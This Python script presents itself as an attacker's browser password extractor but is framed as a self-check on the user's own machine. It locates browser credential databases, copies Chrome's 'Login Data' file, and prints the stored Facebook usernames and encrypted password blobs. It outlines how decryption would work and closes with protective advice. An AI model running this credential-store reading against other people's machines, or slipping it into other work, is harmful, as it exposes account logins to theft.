#!/usr/bin/env python3
"""
REAL ATTACKER: Browser Password Extractor for Facebook
Extracts saved passwords from browser storage
"""

import os
import subprocess
import sqlite3
import shutil
from pathlib import Path

def banner():
    print("💀 BROWSER PASSWORD EXTRACTOR - FACEBOOK")
    print("=" * 60)
    print("⚠️  REAL ATTACKER: Extracting Facebook password from browser")
    print()

def find_browser_databases():
    """Locate Chrome/Chromium password databases"""
    print("🔍 Searching for browser password databases...")
    
    possible_paths = [
        "~/.config/google-chrome/Default/Login Data",
        "~/.config/chromium/Default/Login Data",
        "~/.config/BraveSoftware/Brave-Browser/Default/Login Data",
        "~/.var/app/com.google.Chrome/config/google-chrome/Default/Login Data",
        "~/.mozilla/firefox/*.default*/logins.json"
    ]
    
    found_dbs = []
    
    for path_pattern in possible_paths:
        expanded = os.path.expanduser(path_pattern)
        
        # Handle wildcards
        if '*' in expanded:
            parent = str(Path(expanded).parent)
            pattern = Path(expanded).name
            try:
                for item in Path(parent).parent.glob('**/' + pattern):
                    if item.exists():
                        found_dbs.append(str(item))
                        print(f"   ✅ Found: {item}")
            except:
                pass
        else:
            if os.path.exists(expanded):
                found_dbs.append(expanded)
                print(f"   ✅ Found: {expanded}")
    
    if not found_dbs:
        print("   ❌ No browser password databases found")
    
    return found_dbs

def extract_chrome_passwords(db_path):
    """Extract passwords from Chrome/Chromium database"""
    print(f"\n🔓 Extracting passwords from: {db_path}")
    
    # Copy database (Chrome locks it while running)
    temp_db = "/tmp/chrome_passwords_temp.db"
    
    try:
        shutil.copy2(db_path, temp_db)
        print(f"   📋 Copied database to: {temp_db}")
    except Exception as e:
        print(f"   ❌ Cannot copy database: {e}")
        print(f"   ⚠️  Chrome may be running (locks the file)")
        return []
    
    # Connect to database
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query for Facebook credentials
        cursor.execute("""
            SELECT origin_url, username_value, password_value, date_created
            FROM logins
            WHERE origin_url LIKE '%facebook%' OR origin_url LIKE '%fb.com%'
        """)
        
        facebook_creds = cursor.fetchall()
        
        if facebook_creds:
            print(f"   🎯 FOUND {len(facebook_creds)} FACEBOOK CREDENTIALS!")
            print()
            
            for i, (url, username, enc_password, date) in enumerate(facebook_creds, 1):
                print(f"   [{i}] Facebook Account:")
                print(f"       🌐 URL: {url}")
                print(f"       👤 Username: {username}")
                print(f"       🔐 Password: [ENCRYPTED - {len(enc_password)} bytes]")
                print(f"       📅 Saved: {date}")
                print()
                print(f"       💀 ATTACKER WOULD NOW:")
                print(f"          1. Decrypt password using Chrome master key")
                print(f"          2. Login to your Facebook account")
                print(f"          3. Steal all your data")
                print(f"          4. Message your friends pretending to be you")
                print(f"          5. Post as you")
                print(f"          6. Access Facebook Messenger")
                print()
        else:
            print("   ❌ No Facebook credentials found in database")
        
        conn.close()
        os.remove(temp_db)
        
        return facebook_creds
        
    except sqlite3.Error as e:
        print(f"   ❌ Database error: {e}")
        return []

def attempt_password_decryption():
    """Explain password decryption process"""
    print("\n🔓 PASSWORD DECRYPTION PROCESS")
    print("=" * 60)
    print("⚠️  Chrome passwords are encrypted, but can be decrypted!")
    print()
    print("💀 REAL ATTACKER WOULD:")
    print("   1. Extract Chrome 'Local State' file")
    print("   2. Get encryption key from file")
    print("   3. Use system keyring to decrypt key")
    print("   4. Decrypt all passwords")
    print()
    print("🔐 PROTECTION:")
    print("   ✅ Use 2FA on Facebook (protects even if password stolen)")
    print("   ✅ Use password manager instead of browser")
    print("   ✅ Set Chrome master password")
    print("   ✅ Enable disk encryption")

def main():
    banner()
    
    # Find browser databases
    databases = find_browser_databases()
    
    if not databases:
        print("\n🎉 GOOD NEWS: No browser password databases found!")
        print("   Your passwords are NOT saved in browser.")
        print()
        print("⚠️  BUT YOU SAID: 'Facebook password is saved there'")
        print()
        print("🔍 LET ME CHECK MORE LOCATIONS...")
        
        # Check all common browser locations
        print("\n🔍 Checking ALL browser locations...")
        
        browsers = {
            'Chrome': '~/.config/google-chrome/',
            'Chromium': '~/.config/chromium/',
            'Brave': '~/.config/BraveSoftware/Brave-Browser/',
            'Firefox': '~/.mozilla/firefox/',
            'Edge': '~/.config/microsoft-edge/',
            'Opera': '~/.config/opera/',
        }
        
        for browser, path in browsers.items():
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                print(f"   ✅ {browser} installed: {expanded}")
                
                # Check for Login Data
                login_data = os.path.join(expanded, 'Default/Login Data')
                if os.path.exists(login_data):
                    print(f"      🎯 PASSWORD DATABASE FOUND!")
                    databases.append(login_data)
            else:
                print(f"   ❌ {browser} not found")
        
        print()
    
    # Extract from found databases
    if databases:
        all_creds = []
        for db in databases:
            creds = extract_chrome_passwords(db)
            all_creds.extend(creds)
        
        # Decryption explanation
        attempt_password_decryption()
        
        # Summary
        print("\n" + "=" * 60)
        print("📊 EXTRACTION SUMMARY")
        print("=" * 60)
        
        if all_creds:
            print(f"🚨 CRITICAL: Found {len(all_creds)} Facebook credentials!")
            print()
            print("⚠️  IMMEDIATE ACTIONS REQUIRED:")
            print("   1. ❌ DELETE Facebook password from browser")
            print("   2. ✅ Enable Facebook 2FA immediately")
            print("   3. ✅ Change Facebook password")
            print("   4. ✅ Check Login Activity (see who accessed account)")
            print("   5. ✅ Review Active Sessions (logout unknown devices)")
            print("   6. ✅ Use password manager instead")
        else:
            print("✅ No Facebook credentials found")
            print()
            print("⚠️  If you said password is saved, check:")
            print("   - Which browser you use")
            print("   - If browser is currently running (locks database)")
            print("   - If password is in different profile")
    else:
        print("\n✅ NO PASSWORD DATABASES FOUND")
        print("   Your Facebook password is NOT saved in browser!")
        print("   This is GOOD for security!")

if __name__ == "__main__":
    main()
